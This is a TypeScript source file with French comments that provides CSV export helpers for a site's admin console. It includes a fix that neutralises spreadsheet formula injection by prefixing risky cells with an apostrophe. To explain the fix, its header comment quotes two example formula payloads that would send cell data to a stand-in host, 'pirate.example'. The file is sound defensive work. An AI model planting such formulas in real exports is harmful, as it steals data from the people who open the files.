// lib/export-csv.ts
// ─────────────────────────────────────────────────────────────────
// Lot 26 — helpers d'EXPORT CSV partagés par les routes de la console
// admin (segments d'utilisateurs, statistiques de recherche).
// Même format que la sauvegarde du Lot 25 : séparateur « ; » + BOM
// UTF-8 pour que Excel affiche les accents correctement.
// (Ne pas confondre avec lib/csv.ts = mini-parseur d'IMPORT du Lot 23.)
//
// Lot 84 — SÉCURITÉ : INJECTION DE FORMULES CSV (OWASP « CSV Injection »).
//   Une cellule qui COMMENCE par « = » « + » « - » « @ » (ou une
//   tabulation / un retour chariot) est interprétée comme une FORMULE
//   par Excel / LibreOffice / Google Sheets à l'ouverture du fichier.
//   Or ces exports contiennent des saisies des membres : requêtes de
//   recherche, noms de listes, noms d'outils proposés, avis…
//   Un membre malintentionné pouvait nommer une liste
//     =HYPERLINK("http://pirate.example/?d="&A1;"clique ici")
//   ou  =WEBSERVICE("http://pirate.example/?"&A1)
//   → dès que l'ADMIN exportait la table en CSV et l'ouvrait dans
//   Excel, la formule s'exécutait (exfiltration de cellules voisines,
//   invite de commande sur Windows via DDE…).
//   Parade standard OWASP : on fait précéder ces cellules d'une
//   apostrophe « ' » → Excel les traite comme du TEXTE brut, la
//   formule ne s'exécute jamais, et le contenu reste lisible.
// ─────────────────────────────────────────────────────────────────
import { NextResponse } from "next/server";

/**
 * Lot 84 — neutralise une valeur qui pourrait être exécutée comme
 * formule par un tableur. Si la valeur COMMENCE par un caractère
 * dangereux (= + - @ tabulation retour chariot), on la fait précéder
 * d'une apostrophe : le tableur l'affiche telle quelle, sans calcul.
 * Appliquée à TOUTES les cellules de TOUS les exports CSV du site
 * (les données viennent en partie des membres : rien ne doit pouvoir
 * s'exécuter à l'ouverture du fichier).
 */
export function neutraliserFormuleCsv(valeur: unknown): unknown {
  if (typeof valeur !== "string") return valeur;
  if (/^[=+\-@\t\r]/.test(valeur)) return `'${valeur}`;
  return valeur;
}

/** Sérialise une valeur pour une cellule CSV (séparateur « ; »). */
export function celluleCsv(valeurInconnue: unknown): string {
  // Lot 84 — anti formule AVANT tout le reste.
  const valeur = neutraliserFormuleCsv(valeurInconnue);
  let texte: string;
  if (valeur === null || valeur === undefined) texte = "";
  else if (valeur instanceof Date) texte = valeur.toISOString();
  else if (typeof valeur === "object") texte = JSON.stringify(valeur);
  else texte = String(valeur);
  if (/[;"\n]/.test(texte)) return `"${texte.replace(/"/g, '""')}"`;
  return texte;
}

/** Construit un CSV à partir de lignes objets (colonnes = union des clés). */
export function versCsv(lignes: Record<string, unknown>[]): string {
  if (lignes.length === 0) return "(aucune ligne)";
  const colonnes = [
    ...lignes.reduce((set, l) => {
      Object.keys(l).forEach((k) => set.add(k));
      return set;
    }, new Set<string>()),
  ];
  const entete = colonnes.join(";");
  const corps = lignes
    .map((l) => colonnes.map((c) => celluleCsv(l[c])).join(";"))
    .join("\n");
  return `\uFEFF${entete}\n${corps}`;
}

/** Réponse fichier avec en-têtes de téléchargement. */
export function reponseFichierCsv(contenu: string, nomFichier: string) {
  return new NextResponse(contenu, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${nomFichier}"`,
      "Cache-Control": "no-store",
    },
  });
}